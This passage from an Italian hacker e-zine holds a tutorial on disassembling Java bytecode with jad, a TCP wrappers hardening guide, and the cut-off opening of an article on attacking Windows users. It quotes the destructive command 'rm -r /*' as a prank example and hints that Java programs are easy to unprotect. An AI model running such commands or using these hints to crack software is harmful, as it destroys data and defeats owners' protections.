"macrolinguaggio". Ad eseguire il nostro .class non sara', quindi, il
processore ma un programma che interpreta i bytecode e trasmette i comandi
corrispondenti al processore.
Rivediamo la cosa usando un po' di ascii-art:

 ----------   ------------   ----------   ---------   -------
 |  File  |   | Compiler |   |  File  |   |  JVM  |   | CPU |
 | .java  |-->|          |-->| .class |-->|       |-->|     | 
 ----------   ------------   ----------   ---------   -------

chiaramente l'intermediazione della JVM per l'esecuzione dei programmi rende i
.class assai piu' lenti del codice nativo. Tuttavia l'obiettivo dei
progettisti e' stato quello di ottenere la portabilita' su diverse piattaforme
del compilato, e, devo dire, ci sono riusciti.
La JVM puo' essere utilizzata indipendentemente dal linguaggio Java vero e
proprio. I costrutti del linguaggio sono noti al solo compiler, mentre alla
JVM compete la sola esecuzione del macrocodice prodotto da quest'ultimo.
Cosi' come gli assembler consentono di programmare direttamente con il codice
della CPU allo stesso modo esistono delle applicazioni che consentono di
programmare direttamente la JVM.

1.1 Principi di funzionamento della JVM
    -----------------------------------

Innanzitutto la JVM non include alcun meccanismo di controllo sulla coerenza
dei tipi di dati passati alle sue istruzioni. Si presuppone che il controllo
sui tipi sia stato gia' effettuato dal compilatore. Possiamo raggruppare i
tipi in due categorie: quelli primitivi e i reference. I dati primitivi sono
i classici int, long, float... mentre i reference rappresentano
*esplicitamente* gli oggetti che utilizza il programma.
Oltre ai tipi primitivi numerici sono presenti anche quelli del tipo
returnaddress usati dalle istruzioni di controllo come vedremo in seguito.
I returnaddress non hanno alcun tipo corrispondente nel linguaggio java ma
sono una produzione "esclusiva" del compilatore. Una attenzione particolare
merita il tipo boolean che non ha un corrispettivo nell'ambito della JVM e che
viene trattato come se fosse un int.
Per quanto riguarda i reference, possono "puntare" tre tipi di oggetti: le
classi, le intefacce e gli array. Un reference puo' assumere anche il valore
null (cioe' nessun oggetto).
Come un qualsiasi processore anche la JVM ha un suo insieme di registri. Il
registro pc assume lo stesso significato che ha il registro IP nei processori
Intel: e' il "program counter" ovvero contiene la posizione della istruzione
eseguita in quel momento. Il pc non e' definito se il metodo eseguito dalla
JVM e' "nativo", cioe' fa parte del set di metodi messi a disposizione del
linguaggio (come quelli delle awt, per esempio) oppure scritti in altri
linguaggi. Tali metodi, infatti, vengono eseguiti direttamente dal
microprocessore, bypassando la JVM.
La lunghezza del registro pc e' una word.
Nella JVM e' presente il cosiddetto Java Stack. Esso contene una serie di
sottostrutture, dette frame, che contengono le variabili locali, i risultati
parziali e le informazioni per le chiamate ai membri di altre classi. Inoltre
e' presente un heap in cui vengono memorizzati gli array e le istanze delle
varie classi. 
Assai importante e' una particolare tabella di simboli, detta constant pool.
Essa contiene, per ogni classe, il valore delle costanti e i reference ai
metodi che la classe usa.

1.2 I frame
    -------

Analizziamo con maggiore dettaglio questa particolare struttura. Essa viene
creata per ogni metodo che viene invocato. In ogni istante e' definito un
metodo corrente e il corrispettivo frame. Un frame cessa di essere il frame
corrente quando il metodo corrente chiama un altro metodo. Al ritorno della
chiamata il frame torna ad essere il "frame corrente". Ogni frame presenta
un'area dedicata alle variabili locali e un'altra che funge da stack per gli
operandi che di volta in volta sono necessari alle istruzioni della JVM.
Le variabili locali vengono memorizzate in un array i cui elementi possono
essere richiamati nel piu' classico dei modi: mediante il loro indice. Ogni
locazione di questo array e' sempre lunga una word. Per le variabili che
occupano piu' word viene riservata piu' di una locazione.
Per quanto riguarda lo stack operandi, esso viene usato per passare parametri
ai metodi e per riceverne i risultati, nonche' per fornire gli operandi alle
istruzioni della JVM (come vedremo in seguito).

2.0 Tools
    -----

Prima di procedere all'analisi di un file .class vediamo di quali tools
abbiamo bisogno. E' inutile dire che avete bisogno del Java Development Kit,
necessario per compilare i file .java (http://java.sun.com). Per convertire i
file .class nel corrispondente bytecode avete bisogno di un disassembler: per
i nostri scopi esistono due programmi: D-Java e Jdis. Il primo e' scritto in
c e lo trovate sia per win che per solaris; tuttavia ho notato un certo
"impapocchiamento" del programma nell'assegnazione delle label. Non ci resta
che usare Jdis che e' scritto in java ed e' quindi eseguibile in tutte le
piattaforme con una JVM.
Ho stretto la cerchia dei disassembler a d-java e jdis perche' consentono di
avere l'output nel formato di jasmin; jasmin e' un assemblatore che, ricevuto
il bytecode in ingresso lo trasforma in un file .class. Infine, ma non ultimi,
troviamo due decompilatori veri e propri: jad e mocha. Jad e' scritto in c ed
e' reperibile in formato .exe per dos; mocha e' invece scritto in java.
Entrambi producono, a partire da un file .class il corrispondente .java .
Tutti questi "attrezzi" li trovate sul sito
http://Meurrens.ML.org/ip-Links/Java/codeEngineering/

3.0 Le istruzioni della JVM: un esempio
    -----------------------------------

Introdurremo ora le varie istruzioni della JVM ricorrendo ad un esempio
significativo. Analizzeremo l'applet NervousText fornita nei demo del JDK
nella dir /demo/NervousText. Abbiamo gia' a disposizione il file .class
quindi non ci resta che disassemblarlo per carpirne i segreti. Dato che e'
molto interessante capire la corrispondenza bytecode/istruzioni java
utilizzeremo il jad usando il parametro -a (annotate) che pone le istruzioni
della JVM come commento alle linee di codice ricostruito:

jad -a NervousText.class

Quello che otteniamo e' un file di testo con estensione .jad che contiene
sorgente e assembly JVM. Analizziamolo.
In testa al sorgente troviamo il solito e familiare "preambolo" in cui vengono
dichiarate le classi java necessarie al corretto funzionamento dell'applet:

import java.applet.Applet;
import java.awt.*;
import java.awt.event.*;

public class NervousText extends Applet
    implements Runnable, MouseListener
{

Vengono poi definiti i membri della classe NervousText. Da questo punto in poi
jad comincia a sfornare anche il codice della JVM.

public void init()
    {
        banner = getParameter("text");
    //    0    0:aload_0         
    //    1    1:aload_0         
    //    2    2:ldc1            #6   <String "text">
    //    3    4:invokevirtual   #31  <Method String Applet.getParameter(String)>
    //    4    7:putfield        #25  <Field String banner>

Nelle prime tre righe abbiamo il codice sorgente mentre nei commenti sono
presenti le istruzioni JVM che lo implementano. Vediamo cosa significano e
come operano.

aload_0		Viene posto in cima allo stack operandi il riferimento alla
		classe della variabile locale numero 0. In questo caso tale
		variabile e' Banner ma di essa viene "pushato" solo
		l'informazione "banner e' una stringa" e non il valore o
		l'area di memoria ad essa associata. L'istruzione viene
		eseguita due volte e vedremo fra poco il perche'.

ldc1 #6         Viene pescato l'elemento numero 6 del "constant pool". Il
		constant pool puo' essere visto come un "array" in cui il
		compilatore java memorizza le costanti usate dal programma
		(ma non solo). In questo caso il numero 6 corrisponde alla
		stringa "text" che viene posta in testa allo stack.

invokevirtual #31  Ecco l'istruzione che piu' spesso ricorre nell'assembly
		   JVM: invokevirtual. Essenzialmente "chiama" il metodo
	  	   numero 31 che in questo caso corrisponde alla getParameter
		   della classe applet. Anche questa volta il numero 31 fa
		   riferimento ad una posizione del constant pool che contiene
		   il nome del metodo da "invocare". Inoltre, sempre nel campo
		   31 del constant pool e' indicato il numero di argomenti
		   necessari alla funzione. Essi devono risiedere nello stack
		   secondo l'ordine:

                   argomento n
                   argomento n-1
                     ...
                   argomento 1
                   riferimento all'oggetto che contiene il risultato
                     ...
                   
                   Quindi, appena dopo gli argomenti, in cima allo stack va
		   posto il riferimento all'oggetto che deve contenere il
		   risultato dell'elaborazione del metodo.
                   Nel caso specifico prima di invoke virtual abbiamo la
		   seguente situazione nello stack:

                   riferimento alla stringa "text"
                   riferimento ad un oggetto stringa
                   riferimento ad un oggetto stringa
                     ...

                   dopo l'esecuzione della invokevirtual lo stack conterra' il
		   solo risultato della getParameter (oggetto stringa)
		   riferimento ad un oggetto stringa.
		   In pratica il riferimento "consumato" dalla invoke e'
		   servito a determinare solo il tipo di valore in uscita, in
		   accordo con quello che abbiamo detto in occasione della
		   aload_0. E' importante notare che l'assegnamento del
                   risultato alla variabile Banner non e' ancora avvenuto.

putfield #25	Finalmente viene prelevato il risultato della getParameter e
		viene memorizzato nella posizione 25 del constant pool. Il
		tipo dell'oggetto memorizzato al 25 viene determinato in base
		al rifermento successivo al risultato. Nel nostro caso alla
		fine dell'operazione lo stack e' vuoto. E' per questo motivo
		che l'aload iniziale e' stato ripetuto due volte.

Da queste prime istruzioni si nota subito la cruciale importanza del constant
pool e del livello tutto sommato alto del bytecode. Gli oggetti e i metodi
vengono trattati in quanto tali e non vengono scomposti in tipi piu'
elementari come accade nei compilatori normali.
Proseguiamo nell'analisi...

         if(banner == null)
    //*   5   10:aload_0         
    //*   6   11:getfield        #25  <Field String banner>
    //*   7   14:ifnonnull       23

Di aload abbiamo gia' parlato: un riferimento al tipo stringa viene posto in
cima allo stack.

getfield #25	Si tratta dell'istruzione duale a putfield. Nel nostro caso lo
		stack contiene unicamente il riferimento ad un oggetto stringa
                     ...

                dopo il getfield viene preso il campo #25 del constant pool e
		il suo valore viene trattato come una instanza della classe
		stringa: lo stack conterra' il risultato della getfield:

                   valore dell'oggetto stringa #25
                     ...

ifnonnull 23	Ecco la prima istruzione di controllo che incontriamo. Il suo
		uso e' intuitivo. Controlla che il valore in cima allo stack
		non sia null e se non lo e' salta alla linea 23 altrimenti
		prosegue nell'esecuzione. Come e' prassi il valore in cima
		allo stack (utilizzato nel controllo) viene "poppato" via.

Chi ha un po' di esperienza nei linguaggi di alto livello notera' una certa
somiglianza col costrutto if...goto. Tutti i costrutti if..then..else..
vengono "compilati" ricorrendo all'uso di if...goto e goto semplici. Nel
nostro caso il ramo "then" e' costituito dalle istruzioni dalla 17 alla 20:

            banner = "HotJava";
    //    8   17:aload_0
    //    9   18:ldc1            #1   <String "HotJava">
    //   10   20:putfield        #25  <Field String banner>

Da queste linee si nota che il ramo then non e' altro che un assegnamento di
una costante alla stringa banner. In particolare viene assegnata la stringa
contenuta nella posizione #1 del costant pool all'oggetto contenuto nella
posizione #25 (che abbiamo visto essere banner).

       int i = banner.length();
    //   11   23:aload_0
    //   12   24:getfield        #25  <Field String banner>
    //   13   27:invokevirtual   #32  <Method int String.length()>
    //   14   30:istore_1
 
Le prime tre istruzioni si incaricano di richiamare il metodo length
dell'oggetto banner (in realta' viene invocato il metodo length della classe
string che agisce sul valore in testa allo stack). In questo caso la
definizione della variabile i e' associata alla sua dichiarazione

istore_1	Memorizza il valore in testa allo stack nella variabile locale
		numero 1. Inoltre specifica che tale variabile e' un intero.
		Come sempre il valore in testa allo stack viene eliminato.

        bannerChars = new char[i];
    //   15   31:aload_0
    //   16   32:iload_1
    //   17   33:newarray        char[]
    //   18   35:putfield        #26  <Field char[] bannerChars>

Viene ora dichiarato un array di caratteri. La chiave dell'operazione e'

iload_1		Viene caricato sullo stack il riferimento alla variabile
		locale intera posta nella posizione numero 1 del frame. Si
		tratta della i usata per determinare la lunghezza dell'array
		che si sta per creare.

newarray char[]    Crea un array di caratteri di lunghezza pari al valore
		   intero che si trova in cima allo stack. Naturalmente e'
	           possibile creare array di altri tipi.
                   Dopo l'esecuzione nello stack troviamo un reference al
		   nuovo array. Il tipo di array da creare viene determinato a
		   partire dal byte successivo all'opcode di newarray, secondo
		   la tabella:

                   Array Type | atype
                   ------------------
                   T_BOOLEAN      4
                   T_CHAR         5
                   T_FLOAT        6
                   T_DOUBLE       7
                   T_BYTE         8
                   T_SHORT        9
                   T_INT         10
                   T_LONG        11

putfield #26	Il riferimento al nuovo array va a occupare la posizione #26
		del constant pool.

  banner.getChars(0, banner.length(), bannerChars, 0);
    //   19   38:aload_0         
    //   20   39:getfield        #25  <Field String banner>
    //   21   42:iconst_0        
    //   22   43:aload_0         
    //   23   44:getfield        #25  <Field String banner>
    //   24   47:invokevirtual   #32  <Method int String.length()>
    //   25   50:aload_0         
    //   26   51:getfield        #26  <Field char[] bannerChars>
    //   27   54:iconst_0        
    //   28   55:invokevirtual   #30  <Method void String.getChars(int, int, char[], int)>

La serie di istruzioni prima dell'invoke finale serve a ricostruire i
parametri da passare al metodo getChars della classe string. Considerando
quando detto in precedenza non dovrebbe essere difficile rendersi conto di
come i vari parametri si avvicendano nello stack. L'unica novita' e' la

iconst_0	Inserisce la costante intera 0 in cima allo stack. Esistono
		diverse alternative per questa istruzione:

                   Istruzione | Costante associata
                   -------------------------------
                   iconst_m1           -1
                   iconst_0             0
                   iconst_1             1
                   iconst_2             2
                   iconst_3             3
                   iconst_4             4
                   iconst_5             5

                   Non esistono altri tipi di comandi iconst.

        threadSuspended = false;
    //   29   58:aload_0
    //   30   59:iconst_0
    //   31   60:putfield        #42  <Field boolean threadSuspended>

Ecco un semplice assegnamento: notiamo che il valore false e' in realta'
l'intero 0.

        resize(15 * (i + 1), 50);
    //   32   63:aload_0
    //   33   64:bipush          15
    //   34   66:iload_1
    //   35   67:iconst_1
    //   36   68:iadd
    //   37   69:imul
    //   38   70:bipush          50
    //   39   72:invokevirtual   #37  <Method void Applet.resize(int, int)>

Prima della chiamata alla funzione resize il compilatore produce una serie
di istruzioni necessarie a valutare le espressioni passate come argomenti di
resize.

bipush 15	Bipush inserisce un byte nello stack, nel caso particolare 15

iadd	Somma due interi in cima allo stack e il risutato e' posto ancora
	nello stack.

imul	Funziona come iadd ma esegue la moltiplicazione

Anche in questo caso e' di fondamentale inportanza seguire i valori che si
susseguono nello stack (non mi stanchero' mai di dirlo).

        setFont(new Font("TimesRoman", 1, 36));
    //   40   75:aload_0
    //   41   76:new             #11  <Class Font>
    //   42   79:dup
    //   43   80:ldc1            #3   <String "TimesRoman">
    //   44   82:iconst_1
    //   45   83:bipush          36
    //   46   85:invokespecial   #23  <Method void Font(String, int, int)>
    //   47   88:invokevirtual   #39  <Method void Component.setFont(Font)>

new #11		Crea un nuovo oggetto, in questo caso della classe nella
		posizione 11 del constant pool. Nello specifico si tratta di
		un oggetto font.

Dopo la creazione e' necessario richiamare il costruttore dell'oggetto con i
propri parametri.
Dove devono risiedere questi parametri?? Ma nello stack naturalmente! Cosi' si
spiega il dup che duplica tutto cio' che si trova in testa allo stack (in
questo caso il reference all'oggetto font appena creato) e la serie di
aggiustamenti prima della chiamata al costruttore font() mediante

invokespecial #23   E' utilizzato, con le stesse regole di invokevirtual, per
		    richiamare il costruttore di un'istanza di una classe. In
		    particolare la posizione 23 del constant pool contiene
		    l'inizializzatore della classe font.

        addMouseListener(this);
    //   48   91:aload_0
    //   49   92:aload_0
    //   50   93:invokevirtual   #24  <Method void Component.addMouseListener(MouseListener)>
    //   51   96:return

Questa procedura informa la JVM che l'applet intercetta gli eventi relativi al
mouse. Da notare come il riferimento alla variabile locale 0 venga usato anche
come riferimento all'oggetto this (cioe' all'istanza della stessa classe che
si sta definendo).

return		Termina il metodo ed elimina tutto cio' che e' contenuto nel
		frame associato al metodo. Tipicamente si usa quando il metodo
		ha alcun parametro in uscita.

    public void destroy()
    {
        removeMouseListener(this);
    //    0    0:aload_0
    //    1    1:aload_0
    //    2    2:invokevirtual   #35  <Method void Component.removeMouseListener(MouseListener)>
    //    3    5:return
    }

Il distruttore si limita a rilasciare l'intercettazione degli eventi del
mouse. Da sottolineare l'uso del reference this.

    public void start()
    {
        runner = new Thread(this);
    //    0    0:aload_0
    //    1    1:new             #20  <Class Thread>
    //    2    4:dup
    //    3    5:aload_0
    //    4    6:invokespecial   #22  <Method void Thread(Runnable)>
    //    5    9:putfield        #38  <Field Thread runner>
        runner.start();
    //    6   12:aload_0
    //    7   13:getfield        #38  <Field Thread runner>
    //    8   16:invokevirtual   #41  <Method void Thread.start()>
    //    9   19:return
    }

Nulla da dire. Dovreste essere in grado di decifrare il bytecode di questo
metodo.
Se non ci riuscite... beh... rileggete dall'inizio :D

    public synchronized void stop()
    {
        runner = null;
    //    0    0:aload_0
    //    1    1:aconst_null
    //    2    2:putfield        #38  <Field Thread runner>
        if(threadSuspended)
    //*   3    5:aload_0
    //*   4    6:getfield        #42  <Field boolean threadSuspended>
    //*   5    9:ifeq            21
        {
            threadSuspended = false;
    //    6   12:aload_0
    //    7   13:iconst_0
    //    8   14:putfield        #42  <Field boolean threadSuspended>
            notify();
    //    9   17:aload_0         
    //   10   18:invokevirtual   #33  <Method void Object.notify()>
        }
    //   11   21:return
    }

Questo stralcio di codice ci consente di esaurire il discorso sulle varianti
dell'if nel set di istruzioni della JVM:

ifeq 21		Se il contenuto dello stack e' nullo salta all'istruzione 21.
		Le istruzioni if<cond> operano su interi secondo la tabella:

                ifeq    salta solo se il valore sullo stack e' 0
                ifne    salta solo se il valore sullo stack e' non 0
                iflt    salta solo se il valore sullo stack e' minore di 0
                ifle    salta solo se il valore sullo stack e' minore o
			uguale a 0
                ifgt    salta solo se il valore sullo stack e' maggiore di 0
                ifge    salta solo se il valore sullo stack e' maggiore o
			uguale a 0

                Esiste anche una variante che opera comparando i due interi
		in cima allo stack (chiamiamoli int1 e int2):

                if_icmpeq    salta se e solo se int1 e' uguale a int2
                if_icmpne    salta se e solo se int1 e' diverso da int2
                if_icmplt    salta se e solo se int1 e' minore di int2
                if_icmple    salta se e solo se int1 e' minore o uguale a int2
                if_icmpgt    salta se e solo se int1 e' maggiore di int2
                if_icmpge    salta se e solo se int1 e' maggiore o uguale
	    		     a int2

		Un'ulteriore situazione prevede l'uso di if_acmpeq e
		if_acmpne che operano sui reference. Chiaramente in questo
		caso non sono previste le relazioni d'ordine.
                E' importante ricordare che gli operandi vengono rimossi dallo
		stack.

Il decompilato di NervousText continua, ma a questo punto dovreste essere in
grado di seguirlo da soli. Prima di concludere vi accludo il quadro sinottico
in cui sono riportati i codici memonici di ogni opcode a seconda del tipo di
dato su cui esso opera.
Per la maggior parte li abbiamo visti gia' in azione su determianti tipi. Per
gli altri vi rimando alla bibbia ;)

opcode  |byte    |short    |int      |long     |float    |double   |char   |reference
-------------------------------------------------------------------------------------
Tipush   bipush  	sipush
Tconst                      iconst    lconst    fconst    dconst            aconst
Tload                       iload     lload     fload     dload             aload
Tstore                      istore    lstore    fstore    dstore            astore
Tinc                        iinc
Taload   baload   saload    iaload    laload    faload    daload    caload  aload
Tastore  bastore  sastore   iastore   lastore   fastore   dastore   castore aastore
Tadd                        iadd      ladd      fadd      dadd
Tsub                        isub      lsub      fsub      dsub
Tmul                        imul      lmul      fmul      dmul
Tdiv                        idiv      ldiv      fdiv      ddiv
Trem                        irem      lrem      frem      drem
Tneg                        ineg      lneg      fneg      dneg
Tshl                        ishl      lshl
Tshr                        ishr      lshr
Tushr                       iushr     lushr
Tand                        iand      land
Tor                         ior       lor
Txor                        ixor      lxor
i2T      i2b      i2s                 i2l       i2f       i2d
l2T                         l2i                 l2f       l2d
f2T                         f2i       f2l                 f2d
d2T                         d2i       d2l       d2f
Tcmp                                  lcmp
Tcmpl                                           fcmpl     dcmpl
Tcmpg                                           fcmpg     dcmpg
if_TcmpOP                   if_icmpOP                                       if_acmpOP
Treturn                     ireturn   lreturn   freturn   dreturn           areturn

5.0 Conclusioni
    -----------

Come da piu' parti e' stato rilevato i tecnici della sun che hanno progettato
java hanno badato esclusivamente alla portabilita' e alla sicurezza della JVM
ma non hanno tenuto in conto gli interessi degli sviluppatori.
Se e' vero che e' possibile "incasinare" il meccanismo di decompilazione e
"offuscare" i nomi dei metodi e delle variabili e' anche vero che pubblicare
un .class equivale a fornirne il sorgente. E' sintomatico il fatto che una
delle piu' interessanti applicazioni scritte in java (il programma
JavaZip 2.0) e' facilmente decompilabile con lo jad e addirittura banale da
sproteggere. Per quel poco di esperienza che ho posso affermare che almeno il
90% delle applicazioni sono pienamente decompilabili, un 5% ha come unica
protezione l'"offuscamento" dei simboli e l'altro 5% mette in difficolta' i
decompilatori. Tuttavia e' sempre possibile disassemblare una applet e, data
la "potenza" del set di istruzioni JVM, e' molto facile esaminare e modificare
il programma con un approccio molto simile al death-listing.
Bene... con questo mi sembra di aver esaurito questa breve guida.
Un consiglio: nel momento in cui decidete di cominciare a scrivere
applicazioni java tenete bene in mente questo punto debole.

								LordFelix



==============================================================================
--------------------------------[ MiSCELLANE0US ]-----------------------------
==============================================================================


------------------[ iNSTALLARE E C0NFiGURARE i TCP WRAPPERS ]-----------------
---------------------------------[ Pr3DaToR ]---------------------------------
 
Consumo: 3 Marlboro Rosse Standard ("Il fumo provoca il cancro")
         2 BigFruit al limone 
         
Saluti: SMaster (...per la sua pazienza!)
 
Musica ascoltata: Turn the Page - Metallica (Garage, Inc. 1998)
                  So What - Metallica (Garage, Inc. 1998)
                  Bleed - Soulfly (Soulfly, 1998)

- Introduzione -
La funzione dei tcp wrappers e' quella di monitorare e filtrare le richieste
di accesso a vari servizi di rete come SYSTAT, FINGER, TELNET, FTP, RLOGIN,
EXEC, TFTP, ecc. Essi, inoltre, permettono di negare o consentire l'accesso di
determinati host a determinati servizi (secondo i file di regole che vedremo
piu' avanti), di verificare che il client risponda alle specifiche RFC931, ma
soprattutto che tale client non cerchi di impersonare l'host address o l'host
name di altri client. Tale caratteristica e' particolarmente importante nei
sistemi che utilizzano servizi come RSH o RLOGIN dove l'hostname del client ha
un ruolo fondamentale nel processo di autenticazione. A tale proposito i
wrapper, oltre ad effettuare un lookup del client per ottenerne l'IP,
effettuano anche una richiesta ad un secondo DNS per verificare che a tale
IP corrisponda effettivamente quel client. Se il wrapper rileva delle
differenze, o se la risposta del secondo DNS non e' disponibile, l'accesso
viene rifiutato. Se sul vostro sistema i wrappers sono stati compilati con
l'opzione -DPARANOID, viene sempre effettuata tale verifica, altrimenti viene
semplicemente eseguito un lookup del client. Per quanto riguarda l'host
address spoofing, e' compito del kernel, se opportunamente compilato,
rifiutare le richieste di connessione da parte di IP numerici. Se il vostro
kernel non esegue tale operazione, potete sempre compilare i wrappers con
l'opzione -DKILL_IP_OPTIONS.
Se non temete lo spoofing, potete invece compilare i wrappers con
-DHOSTS_ACCESS consentendo solo semplici controlli o sull'host o sul servizio
richiesto (oppure una combinazione di entrambi).
Tengo a precisare che l'utilizzo dei tcp wrappers e' invisibile dall'esterno
ed inoltre essi non intervengono, se non nella fase iniziale, nelle
comunicazioni tra client e server: i wrappers sono necessari solo all'avvio
dei demoni (ftpd, telnetd, fingerd, ecc.) richiesti da inted.
Le uniche limitazioni dei tcp wrappers riguardano gli attacchi con la tecnica
della predizione dei numeri di sequenza (sequence number guessing) e, meno
importante, l'utilizzo dei servizi RPC che appaiono in inetd.conf come rpc/tcp
come ad esempio rexd (ma fidatevi, non e' una grossa perdita).
Bene, prima di passare alla configurazione vera e propria dei tcp wrappers
assicuratevi che essi siano installati sul vostro sistema. Nelle distribuzioni
piu' recenti di Linux essi sono gia' compilati (con -DPARANOID!!) e installati
per cui potete passare direttamente alla loro configurazione). Controllate
quindi con find se nel vostro sistema e' presente il file tcpd (solitamente si
trova in /usr/sbin). Se non l'avete vi consiglio di aggiornare il vostro
intero sistema :), altrimenti scaricatevi i tcp wrappers 7.6 da:
ftp.cert.org/pub/tools/tcp_wrappers/tcp_wrappers_7.6.tar.gz
Assicuratevi che dopo l'installazione dei wrappers sia tcpd che tutti i file
da esso utilizzati abbiano un permesso 755 o 555 .
Proseguiamo ora con il verificare che il nostro /etc/inted.conf appaia
come segue:

ftp	stream	tcp	nowait	root	/usr/sbin/tcpd	wu.ftpd -l -i -a
telnet	stream  tcp     nowait  root    /usr/sbin/tcpd	in.telnetd
finger	stream	tcp	nowait	nobody	/usr/sbin/tcpd	in.fingerd -w
systat	stream	tcp	nowait	nobody	/usr/sbin/tcpd	/bin/ps	-auwwx
netstat	stream	tcp	nowait	root	/usr/sbin/tcpd	/bin/netstat	-a  

Ho riportato solo alcune linee d'esempio, l'importante e' notare che, nei
sistemi con i tcp wrappers, i demoni vengono eseguiti mediante tcpd. Quindi
tutti i servizi, ad esclusione di quelli identificati come internal (echo,
daytime, time, ecc.) devono essere preceduti da /usr/sbin/tcpd.
Anche per i demoni che hanno un pathname (percorso) arbitrario potete
aggiungere il loro percorso in questo modo:

telnet  stream  tcp  nowait  root /usr/sbin/tcpd /usr/local/in.telnetd 

Se avete apportato delle modifiche all'inted.conf ricordate che dovete farlo
"ripartire" se volete che tali modifiche abbiano effetto
( " ps -ax | grep inetd " per sapere il pid e " kill -HUP [pid] " ).
Editate ora il vostro /etc/syslog.conf per decidere dove andranno scritti, e
con quale criterio, i log prodotti dai wrappers. Un esempio potrebbe essere:

*.=info;*.=notice				/usr/adm/messages
*.=debug					/usr/adm/debug
*.err						/usr/adm/syslog

Questo significa che tutti i log con priorita' info e notice verranno
memorizzati in /usr/adm/messages, mentre i log con priorita' debug saranno
scritti in /usr/adm/debug infine i log con priorita' err li troviamo in
/usr/adm/syslog.
La sintassi della configurazione dei log e' quindi: classe.priorita logfile
Priorita' possono essere debug, info, notice, emerg, err, ecc... mentre per
classi si intendono kern, auth, lpr, ecc... Altri esempi di syslog.conf:

mail.debug /var/log/syslog 

Questo significa che tutti i log della classe mail con priorita' debug
(o superiore) verranno scritti in /var/log/syslog.
Se avete dei problemi con i file di log e non funzionano come vi aspettate,
usate syslogd -d per vedere cosa accade realmente.
Vi ricordo, a titolo informativo :) la locazione standard dei file di log di
alcuni os *nix:

aix - /var/adm/messages
dunix - /var/adm/syslog.dated/[DATA]/mail.log
hpux9&10 - /usr/spool/mqueue/syslog
irix - /var/adm/SYSLOG 
linux - /var/adm/messages 
solaris - /var/log/syslog 
sunos - /var/log/syslog

Siamo giunti ora nella fase piu' importante della configurazione dei wrappers.
Prima di proseguire nella modifica dei due file interessati, e piu'
precisamente /etc/hosts.allow e /etc/hosts.deny, sappiate che esistono,
sostanzialemte, due modi per controllare l'accesso al vostro sistema.
Il primo prevede di negare, per default, l'accesso a chiunque e consentire
l'uso di determinati servizi a determinati host agendo unicamente su
/etc/hosts.allow (mostly closed). Questo risulta essere un metodo
particolarmente sicuro se intendete consentire l'accesso al vostro sistema
solo ai vostri amici o a persone fidate. Se, al contrario, volete gestire un
sistema aperto a tutti (ad esempio un servizio ftp) potete consentire per
dafault l'accesso a qualsiasi host e negarlo a particolari host, agendo
unicamente su /etc/hosts.deny (mostly opened). Personalmente preferisco il
primo metodo, in quanto mi consente di controllare meglio chi rovista nel mio
filesystem ed essere sicuro che non fara' danni o scherzi stupidi come un
rm -r /* :). Quindi modificate il file /etc/hosts.deny in modo che appaia solo
questa entry (tutte le altre righe potete commentarle con un #):

ALL:ALL

In questo modo abbiamo negato, come detto prima, per default qualsiasi accesso
a qualsiasi servizio.
Vediamo, finalmente, come creare le "regole" di accesso al nostro sistema.
Supponiamo di avere un /etc/hosts.allow come il seguente:

in.fingerd: ALL : banners /usr/local/etc/banners/ : spawn (echo "Access from
%u@%h using %d." | sendmail root) : DENY
in.telnetd: .lamers.edu : DENY
ALL: .arcanet.it EXCEPT lamer.arcanet.it

Nella prima linea il servizio in.fingerd viene negato (DENY) a tutti (ALL) gli
host e ogni richiesta a questo servzio comporta l'invio di una email al root.
Inoltre, ad ogni tentativo di accesso, viene presentato all'utente del client
il banner specificato.
Nella seconda entry il servizio di telnet e' negato solamente a tutti gli
host che terminano con .lamers.edu.
Nell'utima entry tutti i servizi sono consentiti agli host che terminano con
.arcanet.it ECCETTO lamer.arcanet.it.
Avrete gia' dedotto che la sintassi delle entry in hosts.allow e' la seguente:

service: hostname: banners(opzionale) : options

"service" identifica, chiaramente, il servzio in questione (in.fingerd,
in.telnetd, in.ftpd ... dipende da cio' che appare nel vostro inetd.conf).
"hostname" permette di specificare il nome dell'host interessato. Si possono
inoltre utilizzare le wildcard come ALL (tutti), LOCAL (hostname dove non
appare nessun punto), UNKNOW (host sconosciuti), KNOW e PARANOID (host a cui
l'address non corrisponde): EXCEPT non e' considerato come wildcard ma
semplicemente come "operatore".
"banners" specifica quale banner (messaggio) visualizzare ad un client che
richiede un determinato servizio.
Infine "options" permette di eseguire dei comandi da shell come, ad esempio,
spedire una mail al root. E' possibile, inoltre, porre al termine di tale
comando la famosa & che permette di porre in background il processo o il
comando dichiarato. Inoltre i wrappers mettono a disposizione delle variabili
che iniziano con % (come avete visto nell'esempio) chiamate "espansioni",
alcune possono essere:
%a fornisce l'host address
%c fornisce maggiori informazioni sul client
%d nome del processo
%u username del client
Per maggiori dettagli vi consiglio, inoltre, di dare un'okkiata a
man hosts_access(5) .
Infine, dopo aver configurato i nostri /etc/hosts.allow e /etc/hosts.deny,
vediamo di creare i file contenenti i banners, cioe' i messaggi che
appariranno al client. Essi possono essere messaggi di "benvenuto" o messaggi
di "rifiuto" (dipende dalle regole che avete stabilito :))
A tale proposito create, se necessario, la directory /usr/local/etc/banners
nella quale creerete i vostri banners, ognuno per ogni diverso servzio:

/usr/local/etc/banners/in.telnetd   per il telnet
/usr/local/etc/banners/in.ftpd      per l'ftp

OK, siamo giunti al termine della configurazione dei tcp wrappers.
Ora dovete solamente controllare se il vostro hosts.allow e' formalmente
corretto, usate a tale scopo il comando tcpdchk il quale provvedera' a
notificarvi se ha trovato degli errori e se volete simulare l'utilizzo dei
wrapper utilizzate tcpdmatch.
Per il momento questo e' tutto... cosa ci sara' la prossima volta? Bho!

                                                         Pr3DaToR


------------------[ C0ME FAR SUiCiDARE L'UTENTE Di WiND0WS ]------------------
---------------------------------[ Cavallo ]----------------------------------

Consumo: per ora un cazzo
Musica : Radio and U2-The B-Sides (thx Caboto!)
Saluti : (per una volta voglio salutare gente diversa dal solito)
	 Tatjana, Nervous, LordFelix,i Dislessici, Phoenyx e l'Orda,
         Ego^Pfe (se non apri il tuo computer ti apro io...), tutti i crackers
         e i grissini in giro, gli smanettoni di #hwupgrade e tutti gli
         amanti degli mp3 come me (incluso quel bboy di Slump =)))

Avvertimento: (parafrasando il pIG)
              Non rompetemi i coglioni per quello che scrivo, la chiave di
	      questa lettura e' liberta' di informazione! Se la vostra tara
	      mentale non ci arriva potete sempre leggervi qualche storiella
	      del cazzo che ne so, L'uomo che sussurrava ai Cavalli, Se
              invece ve ne basta uno eccomi :)

Come avrete capito questa serie +/- sensata di bit prende SPUTO dall'articolo
di BFi2 del Mastro Don pIG, solo che questa volta ci si prefigge di far
